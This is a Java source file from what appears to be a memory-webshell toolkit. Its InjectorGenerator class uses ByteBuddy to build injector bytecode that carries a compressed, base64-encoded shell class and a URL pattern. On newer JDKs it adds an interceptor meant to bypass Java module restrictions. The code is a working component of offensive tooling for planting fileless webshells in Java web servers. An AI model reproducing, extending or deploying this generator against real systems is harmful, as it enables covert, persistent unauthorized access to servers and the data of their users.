package com.reajason.javaweb.memsell;

import com.reajason.javaweb.buddy.ByPassJdkModuleInterceptor;
import com.reajason.javaweb.buddy.TargetJDKVersionVisitorWrapper;
import com.reajason.javaweb.config.Constants;
import com.reajason.javaweb.util.CommonUtil;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;
import net.bytebuddy.jar.asm.Opcodes;
import org.apache.commons.codec.binary.Base64;

import java.util.Objects;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class InjectorGenerator {

    @SneakyThrows
    public static byte[] generate(Class<?> injectClass, String injectClassName, String shellClassName, byte[] shellBytes, String urlPattern) {
        return generate(injectClass, injectClassName, shellClassName, shellBytes, urlPattern, Constants.DEFAULT_VERSION);
    }

    @SneakyThrows
    public static byte[] generate(Class<?> injectClass, String injectClassName, String shellClassName, byte[] shellBytes, String urlPattern, int targetJdkVersion) {
        String base64String = Base64.encodeBase64String(CommonUtil.gzipCompress(shellBytes)).replace(System.lineSeparator(), "");;
        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(injectClass)
                .name(injectClassName)
                .visit(new TargetJDKVersionVisitorWrapper(targetJdkVersion))
                .method(named("getUrlPattern")).intercept(FixedValue.value(Objects.toString(urlPattern, "")))
                .method(named("getBase64String")).intercept(FixedValue.value(base64String))
                .method(named("getClassName")).intercept(FixedValue.value(shellClassName));
        if (targetJdkVersion >= Opcodes.V9) {
            builder = ByPassJdkModuleInterceptor.extend(builder);
        }

        try (DynamicType.Unloaded<?> make = builder.make()) {
            return make.getBytes();
        }
    }
}
